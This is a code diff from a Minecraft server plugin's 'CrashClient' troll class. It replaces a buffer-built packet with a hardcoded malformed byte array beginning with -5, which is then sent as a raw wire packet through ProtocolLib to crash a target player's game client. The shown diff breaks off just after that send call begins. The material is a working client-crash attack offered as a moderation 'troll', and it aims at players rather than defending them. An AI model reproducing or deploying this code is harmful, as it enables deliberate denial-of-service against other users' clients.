@@ -1,8 +1,6 @@
 package net.octopvp.octocore.core.utils.trolls;
 
 import com.comphenix.protocol.ProtocolLibrary;
-import com.comphenix.protocol.events.PacketContainer;
-import io.netty.buffer.ByteBuf;
 import lombok.Getter;
 import org.bukkit.entity.Player;
 
@@ -49,11 +47,14 @@ public class CrashClient implements Troll {
          */
 
         target.crashClient();
+        /*
         final ByteBuf buf = PacketContainer.createPacketBuffer();
         buf.writeInt(-5);
         byte[] bytes = new byte[buf.readableBytes()];
         buf.readBytes(bytes);
         buf.release();
+         */
+        byte[] bytes = new byte[]{-5, 0, 0, 0, 0, 0, 0, 0, 0};
         try {
             ProtocolLibrary.getProtocolManager().sendWirePacket(
                     target,
